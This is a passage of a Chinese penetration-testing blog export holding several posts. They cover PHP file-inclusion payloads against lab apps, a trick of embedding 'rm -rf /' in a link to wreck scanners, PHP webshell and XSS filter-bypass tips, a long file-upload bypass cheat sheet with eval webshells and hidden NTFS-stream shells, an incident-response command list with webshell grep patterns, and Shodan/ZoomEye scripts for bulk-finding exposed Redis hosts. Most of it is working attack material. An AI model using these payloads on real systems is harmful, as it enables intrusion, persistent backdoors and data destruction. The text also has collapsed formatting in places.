    <content type="text"><![CDATA[学校要搞个译文(真特么不明白有什么卵用…)，然后就找了几篇外国比较好的文章，趁着也涨点姿势。 基本的文件包含攻击不多说，都懂 http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into 192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.php 扩展的文件包含攻击加了个?不是很明白是什么原因，我觉得是截断。 http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.php? language=http://192.168.1.11/shell.php? 空字节截断%00都是老套路 http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into 192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.php%00 更改HTTP http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.ph？language = HTTP：//192.168.1.11/shell.php 更改图像扩展名不知道老外为啥这样说，我觉得是文件伪装啊 修改文件内容，在文件头添加GIF89a，然后修改文件后缀为shell.gif http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.ph?language=http：//192.168.1.11/shell.gif 黑名单攻击修改大小写啦，修改后缀啦，解析漏洞啦，比如.PHP,.php3,.asa,.cer这些啦等等。 http://192.168.1.113/bWAPP/rlfi.php?language=lang_en.php&amp;action=go into192.168.1.11/bWAPP/flfi.php?language=http://192.168.1.11/shell.PHP Base64编码 http://192.168.1.113/bWAPP/rlfi.php?language= php://filter/read=convert.base64-encode-resource=http://192.168.1.11/shell.php 搞到最后老外自己还来个厉害了！！！,把我当时整蒙蔽了。。 PHP input输入流套路…123http://192.168.1.101/bWAPP/rlfi.php?language=php://input&amp;cmd=lsPOST:&lt;?php system($_GET['cmd']);?&gt; Proc/self/environ这个有很多种的，不限于这个日志，比如access.log,error_log等各种日志文件。 通过包含User-Agent的proc/self/environ文件来利用12User-Agent: &lt;?php system($_GET['cmd']);?&gt;http://192.168.1.102/dvwa/vulnerabilities/fi/?page=proc/self/environ&amp;cmd=id PHP文件包含自己的小概述 基本的本地文件包含&lt;?php include(“inc/” .$_GET[‘file’]);?&gt;包含文件在当前目录下：?file=.htaccess目录遍历：？file=../../../../../../../../var/lib/locate.db包含注入的PHP代码：？file=../../../../../../../var/log/apache/error.log一些技巧： 可能的Apache目录列表 包含访问日志，比如/proc/self/fd/X 包含来拥有更多信息的proc文件系统 包含电子邮件的日志文件 包含ssh的认证日志文件 auth.log 尽可能多的尝试头像/图片/附件文件上传 包含会话文件 包含PHP的临时上传文件（可以利用条件竞争）如果你有一个phpinfo()，请参考我们Drops的文章LFI with PHPInfo本地测试过程。 有限制的本地文件包含&lt;?php include(‘inc/’. $_GET[‘file’] . “.htm”); ?&gt;空字节注入：?file=../../../../../../../../etc/passwd%00（需要php配置关闭magic_quotes_gpc）空字节注入目录列表：?file=../../../../../../../var/www/accounts/%00（仅限于UFS系统中，并且需要关闭magic_quotes_gpc）路径截断：?file=../../../../../../etc/passwd.\.\.\.\.\.\.\.\.\...点截断：?file=../../../../../../etc/passwd…………………………（仅限于windows系统中）反向路径截断：?file=../../../../[..]../../../etc/passwd 基本的远程文件包含&lt;?php include($_GET[‘file’]); ?&gt;包含远程代码：?file=[http|https|ftp]://websec.wordpress.com/shell.txt（需要allow_url_fopen、和allow_url_include开启）使用php：input输入流：?file=php://input（在POST参数中设置你的攻击载荷，注意urlencoding，并且需要allow_url_include开启）使用URIs数据：?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=（需要allow_url_include开启）使用XSS：?file=http://127.0.0.1/path/xss.php?xss=phpcode（只有在防火墙或在白名单内的域名才有效） 有限制的远程文件包含&lt;?php include($_GET[‘file’] . “htm”); ?&gt;file=https://websec.wordpress.com/shell?file=https://websec.wordpress.com/shell.txt??file=https://websec.wordpress.com/shell.txt%23（需要allow_url_fopen，allow_url_include开启）?file=\\evilshare\shell.php（绕过allow_url_fopen关闭的情况下）过滤器逃逸：访问带通配符的文件：]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于反爬虫的一个思考]]></title>
    <url>%2F2017%2F03%2F05%2F%E5%85%B3%E4%BA%8E%E5%8F%8D%E7%88%AC%E8%99%AB%E7%9A%84%E4%B8%80%E4%B8%AA%E6%80%9D%E8%80%83%2F</url>
    <content type="text"><![CDATA[最近在开发一个Python的系统，在写爬虫的时候突然想到一个特别猥琐的对付使用脚本进行批量检测的一个小方法。我们在进行批量扫描并检测的时候，都可能会调用一些系统命令，比如如下代码:1234...for i in get_new_urls: os.system("python sqlmap.py -u %s" % i)... 以上代码，如果我们网站的url里有下面的一个链接：1&lt;a href="https://www.baidu.com | rm -rf / "&gt; 那么脚本最后执行的命令就是：1os.system("python sqlmap.py -u https://www.baidu.com | rm -rf /") … 所以你懂的…]]></content>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>安全开发</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP&XSS的一些小tips]]></title>
    <url>%2F2017%2F03%2F04%2FPHP%E5%BC%B1%E7%B1%BB%E5%9E%8B-XSS%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8Ftips%2F</url>
    <content type="text"><![CDATA[最近搜集的一些，PHP过waf webshell,弱类型，openbasedir，XSS绕过的一些小tips，欢迎大牛纠错。-\- 无字母数字webshell构造123456789101112PHP TRUE == 1 FALSE == 0 TRUE + TRUE == 2 异或：' ! '^' ` ' == 'A'取反：~('和'&#123;2&#125;) == 's'PHP 自增：仅允许字母字符自增'a'++ == 'b';'z'++ == 'aa';php 5.3' '.[] == 'Array''Array'&#123;0&#125; === 'A''Array'&#123;3&#125; === 'a'' ' == 0$_=' '.[]; $_&#123;' '&#125;==='A'; 渗透测试小tips 魔术引号不过滤$_SERVER[]字段，造成注入 mysql的类型强制转换可绕过PHP中empty()函数对0的false返回 1提交/?test=0axxx -&gt; empty($_GET['test']) =&gt; 返回真 当可控变量进入双引号中时可形成webshell 12$a = "$&#123;@eval($_POST[s])&#125;";$a = "$&#123;$&#123;eval($_POST[s])&#125;&#125;"; 过滤了空格，逗号的注入，可使用括号包裹绕过 12select(location)from(website);select&#123;x(name)&#125;from&#123;x(manager)&#125;; 由于PHP弱类型验证机制，导致==、in_array()等可通过强制转换绕过验证。 12in_array($_GET['x'],array(1,2,3,4,5))访问?test=’1’testtest可判断成功 windows特性 1windows下php中访问文件名使用”&lt;” “&gt;”将会被替换成”*” “?”，分别代表N个任意字符与1个任意字符 变量覆盖 12$GLOBALS,$_SERVER,$_GET,$_POST,$_COOKIE,$_REQUEST,$_FILES,$_ENV,$_SESSIONparse_str(),mb_parse_str(),import_request_variables(),extract() PHP的强制类型转换的原则 对于数学运算，字符串转换为数值 对于字符串运算，数值转换为字符串PHP弱类型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051== 只检查值，不检查类型=== 既检查值，又检查类型NULL,0,”0”,array()使用==和false比较时，都是会返回true的，而使用===却不会123abc == 123 —&gt; true0 == 'abc' —&gt; true'0e132456789'=='0e7124511451155' —&gt;true240610708、QNKCDZO、aabg7XSs、aabC9RqS的MD5相同intval()函数：string转intintval('0x1e240')=='123456' //trueintval('0x1e240')==123456 //trueintval('0x1e240')=='1e240' //false当其中的一个字符串是0x开头的时候，ox开头表示16进制，PHP会将此字符串解析成为十进制然后再进行比较，0×1e240解析成为十进制就是123456，所以与int类型和string类型的123456比较都是相等对数组进行MD5，sha1等hash运算时，结果都为NULLmd5(name[] = 1) == md5(password[]= 2) —&gt;NULL == NULL —&gt;truestrcmpstrcmp(string $str1,string $str2 )如果str1小于str2,返回-1，相等返回0，否则返回1。strcmp函数比较字符串的本质是将两个变量转换为ascii，然后进行减法运算，然后根据运算结果来决定返回值。如果传入的参数为数字或数组,再和字符串做strcmp，就会返回NULLstrcmp($array,'123') == 0当array为数字或者数组时，等式等于true$array=[1,2,3] —&gt; strcmp([1,2,3] ,'123') —&gt; NULL —&gt;NULL == 0in_array()：函数搜索数组中是否存在指定的值$array=(0,1,2,'3')in_array('abc', $array) —&gt; 'abc' —&gt; 0 —&gt; 0 == array[0] —&gt; true$array=(0,1,2,3)in_array($search, $array)当传入$search = 1'aaaaaaaa 结果为truein_array($search, $array) —&gt; 1'aaaaaaaa —&gt; 1 —&gt; 1 == array[1] —&gt; true注：in_array 有第三个参数in_array(’5\’ union select’, array(1, 5, 3, 2), true) —&gt; falseeregereg(string pattern, string string, array [regs])字符串对比解析，以 pattern 的规则来解析比对字符串 string。比对结果返回的值放在数组参数 regs 之中，regs[0] 内容就是原字符串 string、regs[1] 为第一个合乎规则的字符串、regs[2] 就是第二个合乎规则的字符串，余类推。若省略参数 regs，则只是单纯地比对，找到则返回值为 true。ereg函数存在NULL截断漏洞，当ereg读取字符串string时,如果遇到了%00,后面的字符串就不会被解析$ip = "192.168.2.11".chr(0)."haha"; if(ereg("^[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;$",$ip)) &#123; echo $ip; &#125; else &#123; echo "unknown"; &#125; 输出：192.168.2.11haha注：结合ereg处理$ _SERVER的情况 绕过open_basedir12345利用DirectoryIterator + Glob 直接列举目录realpath列举目录SplFileInfo::getRealPath列举目录GD库imageftbbox/imagefttext列举目录bindtextdomain暴力猜解目录 XSS绕过123456789. 可以用 withonerror 可以用 onblur oncutwindow 可以用 top parent selfal%00ert``\x0A\x0D 可以用 \x2028\x2029base64解码函数atob()"oncut=_=window;_.onerror=_["al"+"ert"];throw[1]"oncut=location="javascript:aler"+"t%"+"281%"+"29]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>webshell</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传(绕过)]]></title>
    <url>%2F2017%2F02%2F21%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E7%BB%95%E8%BF%87%2F</url>
    <content type="text"><![CDATA[根据个人经验,搜集总结，欢迎大牛们补充、纠错 -_- 文件上传校验姿势 客户端javascript校验（一般只校验后缀名） 服务端校验 文件头content-type字段校验（image/gif） 文件内容头校验（GIF89a） 后缀名黑名单校验 后缀名白名单校验 自定义正则校验 WAF设备校验（根据不同的WAF产品而定） 文件上传绕过校验姿势 客户端绕过（抓包改包） 服务端绕过 文件类型 文件头 文件后缀名 配合文件包含漏洞绕过 配合服务器解析漏洞绕过 CMS、编辑器漏洞绕过 配合操作系统文件命名规则绕过 配合其他规则绕过 WAF绕过 黑名单绕过 白名单绕过 1.客户端绕过可以利用burp等抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。 2.服务端绕过2.1 文件类型绕过我们可以通过抓包，将content-type字段改为image/gif 2.2 文件头绕过在木马文件内容开头加上一些文件头信息 GIF89a&lt;?php phpinfo(); ?&gt; 判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：1234（1） .JPEG;.JPE;.JPG，”JPGGraphic File”（2） .gif，”GIF 89A”（3） .zip，”Zip Compressed”（4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” 2.3 文件名/后缀绕过2.3.1 截断test.php%00.jpg,test.php0xoo.jpg 2.3.2 windows特性123456789ADS流：test.php::$DATA(见下)test.php.test.php_test.php(空格)*=.&lt;=*&gt;=?test.&lt;&lt;&lt;test.php:1.jpg会生成一个test.php的空文件 2.3.3 ASP1234567891011121314解析漏洞:.asp;.jpg.asp.jpg.asp;jpg+111.asp;+222.jpg/111.asp/1.jpg/111.aspx/1.jpg后缀名：asa,cer,cdx,ashx,asmx,xml,htr,asax双文件扩展：test.asp.jpgRTLO：asp.html-内容为一句话php.txt-内容为一句话 2.3.4 JSP12.jsp.jpg.jsp-用两个jsp包围中间的jpg后缀名：jspf,jspa,jsps 2.3.5 PHP1234567891011121314后缀名：.php3 ,.php5,.php7大小写：pHp解析漏洞：1.php.jpg1.jpg.php1.php jpg(jpg前面两个空格)1.php jpg(jpg前面一个空格)/1.jpg/1.php/1.jpg%00.php/1.jpg/.php/1.jpg/php特殊文件利用：.htaccess.user.ini 3.配合文件包含漏洞 上传一个符合条件格式的文档，文档内容为一句话木马，eg：test.txt 利用文件包含漏洞包含上传的木马文件,eg:page?id=D:/www/test.txt 4.配合服务器解析漏洞123456789101112131415161718IIS5.x-6.x:目录解析(6.0):/1.asp/1.jpg文件解析:1.asp;.jpg文件类型:1.asa,a.cer,1.cdxIIS7.5：IIS7.5是由于php配置文件中，开启了cgi.fix_pathinfApache:从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断后缀不识别：1.php.php123配置错误：1.php.jpgNginx：Nginx默认是以CGI的方式支持PHP解析的，和IIS7.5一样开启了cgi.fix_pathinf1.jpg/1.php1.jpg%00.php1.jpg/%20\1.php上传一个名字为test.jpg，以下内容的文件&lt;?PHP fputs(fopen('shell.php','w'),'&lt;?php eval($_POST[caidao])?&gt;');?&gt;然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php 5.配合操作系统文件命令规则 上传不符合windows文件命名规则的文件名 123456test.asp.test.asp(空格)test.php:1.jpgtest.php::$DATAshell.php::$DATA…….会被windows系统自动去掉不符合规则符号后面的内容。 linux下后缀名大小写在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。 6.CMS、编辑器漏洞 CMS漏洞：针对不同CMS存在的上传漏洞进行绕过。 编辑器漏洞：比如FCK，Ewebeditor等，可以针对编辑器的漏洞进行绕过。 7.其他规则7.1 利用waf特性 在恶意代码前加垃圾数据； 在数据包前加垃圾数据； 在Content-Disposition参数后面加垃圾数据； 多加一个filename； 更改HTTP请求方法； 删除实体里面的Conten-Type字段； 第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。 删除Content-Disposition字段里的空格 增加一个空格 修改Content-Disposition字段值的大小写 文件名后缀处回车 多个Content-Disposition7.2 利用NTFS ADS特性ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。12345test.php:a.jpg 生成test.php 空test.php::$INDEX_ALLOCATION 生成test.php文件夹 test.php::$DATA\1.jpg 生成1.jpg(不可见的)echo ^&lt;?php @eval(request[caidao])?^&gt; &gt; index.php:hidden.jpg这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，&lt;?php include(‘index.php:hidden.jpg’)?&gt;，这样子就可以正常解析我们的一句话了 7.3 利用RTLO1234新建一个文件php.html内容为：&lt;?php @eval($_POST['caidao']);?&gt;重命名文件：输入名字的文本框里点右键，选择“插入unicode控制字符”，然后就到了这个菜单栏，我们选择RLO这个时候php.html已经变成了html.php了 7.4 特殊的长文件名绕过文件名使用非字母数字，比如中文等最大程度的拉长shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg 7.5 反删除将name=&quot;file1&quot;改成了file4，可以防止文件删除（JCMS漏洞） 7.8 图片转换/二次渲染/文件幻数检测 在不破坏文件本身渲染情况下，在空白区进行代码填充，一般是图片注释 溢出攻击 绕过GD库 …]]></content>
      <tags>
        <tag>WAF绕过</tag>
        <tag>PHP</tag>
        <tag>文件上传</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[应急响应资料整理]]></title>
    <url>%2F2017%2F02%2F13%2F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E8%B5%84%E6%96%99%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[趁着最近不是很忙，整理了下最近学习的一些应急响应的一些命令、资料，方便以后查看，有什么问题还望指出，多多交流！ 0.0 怎么做应急响应？具体怎么做应急响应，根据网上应急响应的经验总结几点： 确定攻击时间 查找攻击线索 梳理攻击流程 实施解决方案 定位攻击者 123451、确定攻击时间能够帮助我们缩小应急响应的范围，有助于我们提高效率，2、查找攻击线索，能够让我们知道攻击者都做了什么事情，3、梳理攻击流程则是还原整个攻击场景，4、实施解决方案就是修复安全漏洞，切断攻击途径，5、最后就是定位攻击人，则是取证。 常用命令全是套路，但一般很有用1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465661、备份系统日志及默认的httpd服务日志linux:tar -cxvf secure_logs.tar.gz /var/log/securetar -cxvf messages_logs.tar.gz /var/log/messegestar -cxvf httpd_logs.tar.gz /var/log/httpd/windows:应用程序日志、系统日志、安全日志；默认情况下，如果系统不对事件做审核则不会生成安全日志。开始→设置→控制面板→管理工具→事件查看器Windows日志文件默认位置是%systemroot%\system32\config 安全日志文件：%systemroot%\system32\config \SecEvent.EVT 系统日志文件：%systemroot%\system32\config \SysEvent.EVT 应用程序日志文件：%systemroot%\system32\config \AppEvent.EVT FTP连接日志和HTTPD事务日志：%systemroot% \system32\LogFiles\ IIS日志默认存放在System32\LogFiles目录下，使用W3C扩展格式2、备份last可以查看登录信息(登录时间能不能跟运维人员时间对上)last &gt; last.log3、查询utmp文件并显示当前系统中每个用户和它所运行的进程信息w &gt; w.log4、系统服务备份chkconfig --list &gt; services.log5、查看可疑进程 linux：ps -aux或ps -ef 查看进程文件路径、pid号（一般ps -ef能比较清晰的看出反弹shell）ps -aux的结果比较杂乱,pstree -a的结果比较简单明了lsof -i :port 检查哪个进程使用这个端口lsof -p 1234 检查pid号为1234进程调用情况strace -f -p 1234 跟踪分析pid号为1234的进程windows：tasklist taskkill6、监听端口备份(查看端口及对应服务对外开放情况)linux: netstat -antup &gt; port-listen.logwindows: netstat -ano &gt; port-listen.log7、查看用户信息linux： cat /etc/passwdwindows： net user8、查找最近5天内更改的文件find /home/work -type f -mtime -59、Rootkit查找linux: Rootkit Hunter、chkrootkitwindows: 勒索软件终结者10、查看服务占用资源情况top &gt; top.log11、查看计划任务(很多后门程序通过crontab完成自启)linux： crontab -l不过有时候crontab -l并不能解决问题，通常还要做如下操作：cd /etc/crontablscrontab -r 删除计划任务windows： 管理-&gt;任务计划程序-&gt;任务计划程序库12、查看有没有提权痕迹cat /etc/passwd 极有可能其他用户出现id，组id 0、0的情况lsof -g gid号 通常能找到恶意文件关联的lib文件13、显示最后登录系统的倒数10条记录last -1014、查看执行过什么命令cat ~/.bash_historyhistory | grep '2017-2-12' 根据时间查看干了什么history | tail -n 5 显示最近5次执行的命令history -c 清空history历史15、查找777的权限的文件find / *.jsp -perm 77716、网络连接查看与该ip链接的进程及文件路径、pid号netstat -anp| grep 8.8.8.8 linuxnetstat -ano|find "8.8.8.8" windows WEB方式入侵主要通过web应用程序、strust2、数据库等其他高危漏洞例如apache12345678910111213141516171819apache的默认重要配置信息如下：配置文件：`/etc/httpd/conf/http.conf`服务器的根目录：`/var/www/html`访问日志文件：`/var/log/httpd/access_log`错误日志文件：`/var/log/httpd/error_log`运行apache的用户：apache模块存放路径：`/usr/lib/httpd/modules`1、查看日志文件2、根据日志文件信息定位恶意文件位置3、`stat`记录恶意文件信息4、找到恶意进程比如恶意进程名是fu4k5、进入proc/对应pid目录/fdps -aux | grep fu4kcd /proc/fu4k/fd在/usr/bin目录下，stat信息：stat /usr/bin/fu4k6、查找系统中包含指定字符的所有文件（可以拿已知shell密码及特定字符作为关键字）find /|xargs grep -ri "caidao" -l 2&gt; webshell.log（执行后会改变所有文件的atime） 非web方式入侵主要通过bash其他高危服务，大多属于ssh(22)、vnc(5900)对外且弱口令的情况，主要结合syslog/var/log/message.*判断123456781、判断服务器是否支持访问外网，如支持，通过netstat –an查看是否已与外部可疑服务器建立连接，如已建立需及时断开2、记录后门文件stat信息，根据mtime查找其他后门文件，同时根据文件属组与属组对应运行服务判断入侵方式3、如果权限组为root，需要检测是否被种rootkit4、非web类后门，大部分人习惯把恶意文件放置在`/tmp`目录下；5、通过可疑进程名与cpu占用率排查，有些后门会伪装正常进程名；使用`top`命令查看cpu占用率，找出后门进程6、获取进程pid后可cd到`/proc/对应pid/fd7、查看是否有相关计划任务，后门程序为保证自启动往往会添加新的计划任务 入侵后需要被关注的文件linux:123456789101112131415161718192021222324252627282930/var/log/messages — 包括整体系统信息，其中也包含系统启动期间的日志。此外，mail，cron，daemon，kern和auth等内容也记录在var/log/messages日志中。/var/log/dmesg — 包含内核缓冲信息（kernel ring buffer）。在系统启动时，会在屏幕上显示许多与硬件有关的信息。可以用dmesg查看它们。/var/log/auth.log — 包含系统授权信息，包括用户登录和使用的权限机制等。/var/log/boot.log — 包含系统启动时的日志。/var/log/daemon.log — 包含各种系统后台守护进程日志信息。/var/log/dpkg.log – 包括安装或dpkg命令清除软件包的日志。/var/log/kern.log – 包含内核产生的日志，有助于在定制内核时解决问题。/var/log/lastlog — 记录所有用户的最近信息。这不是一个ASCII文件，因此需要用lastlog命令查看内容。/var/log/maillog /var/log/mail.log — 包含来着系统运行电子邮件服务器的日志信息。例如，sendmail日志信息就全部送到这个文件中。/var/log/user.log — 记录所有等级用户信息的日志。/var/log/Xorg.x.log — 来自X的日志信息。/var/log/alternatives.log – 更新替代信息都记录在这个文件中。/var/log/btmp – 记录所有失败登录信息。使用last命令可以查看btmp文件。例如，”last -f /var/log/btmp | more“。/var/log/cups — 涉及所有打印信息的日志。/var/log/anaconda.log — 在安装Linux时，所有安装信息都储存在这个文件中。/var/log/yum.log — 包含使用yum安装的软件包信息。/var/log/cron — 每当cron进程开始一个工作时，就会将相关信息记录在这个文件中。/var/log/secure — 包含验证和授权方面信息。例如，sshd会将所有信息记录（其中包括失败登录）在这里。/var/log/wtmp或/var/log/utmp — 包含登录信息。使用wtmp可以找出谁正在登陆进入系统，谁使用命令显示这个文件或信息等。/var/log/faillog – 包含用户登录失败信息。此外，错误登录命令也会记录在本文件中。除了上述Log文件以外， /var/log还基于系统的具体应用包含以下一些子目录：/var/log/httpd/或/var/log/apache2 — 包含服务器access_log和error_log信息。/var/log/lighttpd/ — 包含light HTTPD的access_log和error_log。/var/log/mail/ – 这个子目录包含邮件服务器的额外日志。/var/log/prelink/ — 包含.so文件被prelink修改的信息。/var/log/audit/ — 包含被 Linux audit daemon储存的信息。/var/log/samba/ – 包含由samba存储的信息。/var/log/sa/ — 包含每日由sysstat软件包收集的sar文件。/var/log/sssd/ – 用于守护进程安全服务。~/.bash_history 至关重要的日志，往往黑客会使用history -c清理相关的日志 入侵后web服务器日志分析web服务器的种类很多，接触比较多的为apache、tomcat、nagix为主。无论任何web服务器其实日志需要关注的东西是一致的，即access_log和error_log。查看哪些IP在暴力破解root123grep "Failed password for root" /var/log/auth.log | awk '&#123;print $11&#125;' | sort | uniq -c | sort -nr | morecat /var/log/messeges|grep rootcat /var/log/messages |grep 'root from' | wc -l 查看爆破次数 一般确定ip地址后，通过:123find . access_log |grep xargs ip攻击地址find . access_log| grep xargs 木马文件名tail -F /var/log/httpd/error_log | grep ip攻击地址 动态查看日志 通过access_log和error_log中的数据我们一般能明确以下几件事情： 文件是什么时刻上传的，应急响应中确定攻击发生的攻击点十分重要。通过时间点可以有效的查找加密木马，隐蔽的后门等。 攻击的IP地址是多少，当然一般情况是跳板地址T_T 传了什么文件上来 筛选指定IP访问的URL，并按照访问数量排序cat access.log |grep &quot;192.168.11.37&quot; | awk &#39;{print $7}&#39; | sort | uniq -c |sort -nr筛选出访问状态码是500的所有IP地址，并按照访问次数排序cat access.log |grep &quot;HTTP/1.1\&quot; 500&quot; | awk &#39;{print $1}&#39; | sort | uniq -c |sort -nr 筛选/var/log/secure日志找到爆破ssh的ipcat /var/log/secure |grep &#39;Accepted password&#39;查看cron日志1234/etc/cron.hourly/cron.sh/etc/cron.hourly/udev.sh查看第一次计划任务时间：cat /var/log/cron |grep '恶意文件名'|sort|head windows:1234567x:\RECYCLER\C:\Documents and Settings\c:\users\c:\windows\temp\IIS的默认上传目录日志分析工具：[Web日志安全分析工具 v2.0.exe]() 应用系统日志1234MySQL; 在mysql.log找错误消息，看看有没有结构损坏的表， 是否有innodb修复进程在运行，是否有disk/index/query 问题.PHP-FPM; 如果设定了 php-slow 日志, 直接找错误信息 (php, mysql, memcache, …)。Varnish; 在varnishlog 和 varnishstat 里, 检查 hit/miss比. 看看配置信息里是否遗漏了什么规则，使最终用户可以直接攻击你的后端？HA-Proxy; 后端的状况如何？健康状况检查是否成功？是前端还是后端的队列大小达到最大值了？ 入侵后恶意文件查找1234567891011121314151617181920212223find -mtime -2 -type f -name \*.php 查找近2天被修改过的文件find /app -user root 查找app目录下属于root用户的文件查找存在制定关键字的恶意脚本木马find ./ -name "*.php" |xargs egrep "phpspy|c99sh|milw0rm|eval\(gunerpress|eval\(base64_decode|spider_bc"&gt; /tmp/php.txtgrep -r --include=*.php '[^a-z]eval($_POST' . &gt; /tmp/eval.txtgrep -r --include=*.php 'file_put_contents(.*$_POST\[.*\]);' . &gt; /tmp/file_put_contents.txtfind ./ -name "*.php" -type f -print0 | xargs -0 egrep "(phpspy|c99sh|milw0rm|eval\(gzuncompress\(base64_decode|eval\(base64_decode|spider_bc|gzinflate)" | awk -F: '&#123;print $1&#125;' | sort | uniqlinux 下webshell查杀：find /www/ -name "*.php" |xargs egrep 'assert|phpspy|c99sh|milw0rm|eval|\(gunerpress|\(base64_decoolcode|spider_bc|shell_exec|passthru|\(\$\_\POST\[|eval \(str_rot13|\.chr\(|\$\&#123;\"\_P|eval\(\$\_R|file_put_contents\(\.\*\$\_|base64_decode'查杀脚本：[webshell查杀脚本.py]()[webshellkill_linux.py]()rootkit查找windows下：[PC Hunter]http://www.xuetr.com/)[PowerTool] (http://about.me/ithurricanept)linux下：[Rootkit Hunter](http://rkhunter.sourceforge.net/)常规后门查找shift后门等[D盾_Web查杀](http://d99net.net/News.asp?id=62)[Safe3 WebShell Scanner](http://www.273tech.com/works/884981847/view.htm)[暗组Web杀毒 2.6](http://forum.cnsec.org/thread-93025-1-1.html) 其他方面检测 网络相关 异常流量 DDOS ARP DNS 数据库 常见问题关键文件设置使用chattr命令防止系统中某个关键文件被修改：chattr +i /etc/resolv.conf查看使用：lsattr /etc/resolv.conf会显示如下属性 —-i——– /etc/resolv.conf 要想修改此文件就要把i属性去掉： chattr -i /etc/resolv.conf让某个文件只能往里面追加数据，但不能删除(用于各种日志文件上)：chattr +a /var/log/messages系统命令被替换 1、可以选择重新还原回去:yum install e2fsprogs;2、也可以使用系统命令工具包busybox，最后busybox 要还原的命令 -i日志查看/var/log/secure日志可以查看Accept关键字;查找访问和错误日志, 直接找5xx错误, 再看看是否有limit_zone错误; 日志文件恢复linux下日志文件恢复可使用lsof恢复删除的日志文件(前提是不能关闭服务器，不能关闭相关服务或进程)12lsof | grep access_logcat /proc/$PID/fd/$文件描述符 &gt; /var/log/httpd/access_log 部分命令无法执行 当用户环境变量配置不当时，部分命令无法直接执行，需要在命令之前加上路径，如：/etc/sbin/ifconfig]]></content>
      <tags>
        <tag>运维</tag>
        <tag>渗透测试</tag>
        <tag>自动化</tag>
        <tag>webshell</tag>
        <tag>linux</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于MongoDB未授权访问的学习]]></title>
    <url>%2F2017%2F01%2F13%2F%E5%85%B3%E4%BA%8EMongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E7%9A%84%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[最近MongoDB的未授权访问不知道为啥，就是这样突然火了，其实你要是留意的话，其实在2014年的时候就已经有人在乌云刷过这个了，其实很简单，就是没密码，然后暴露到公网上喽。 本次主要做一些redis的一个测试，刚好最近再开发一个系统，刚好写几个脚本做插件，也提高下工作效率。 具体漏洞细节请参考：redis未授权访问 然后利用ZoomEye和Shodan API进行条件批量筛选 ZoomEye：https://api.zoomeye.org/host/search?query=&quot;关键词&quot;&amp;page=Shodan：pip install shodan Shodan python脚本如下：123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/python# -*- coding: UTF-8 -*-'''@Author：w2n1ck@博客：http://byd.dropsec.xyz/'''import shodanimport osiplist = []ip_list = []shodan_ip_list = []def shodanSearch(keywords): SHODAN_API_KEY = "your key" api = shodan.Shodan(SHODAN_API_KEY) total = 0 try: results = api.search(keywords) total = int(results['total']) for result in results['matches']: #iplist.append(&#123;"ip":result['ip_str'],"country":result['location']['country_name']&#125;) iplist.append(result['ip_str']) for i in range(len(iplist)): ip_list = iplist[i].encode('utf-8') shodan_ip_list.append(ip_list) s = '\n'.join(shodan_ip_list) with open('shodan_ip_list.txt','w') as output: output.write(s) except shodan.APIError, e: print 'Error: %s' % eif __name__ == '__main__': shodanSearch('redis') ZoomEye python脚本如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#!/usr/bin/python# -*- coding: UTF-8 -*-'''@Author：w2n1ck@博客：http://byd.dropsec.xyz/'''import osimport requestsimport jsonaccess_token = ''ip_list = []def login(): user = raw_input('[-] input : username :') passwd = raw_input('[-] input : password :') data = &#123; 'username' : user, 'password' : passwd &#125; data_encoded = json.dumps(data) # dumps 将 python 对象转换成 json 字符串 try: r = requests.post(url = 'https://api.zoomeye.org/user/login',data = data_encoded) r_decoded = json.loads(r.text) # loads() 将 json 字符串转换成 python 对象 global access_token access_token = r_decoded['access_token'] except Exception,e: print '[-] info : username or password is wrong, please try again ' 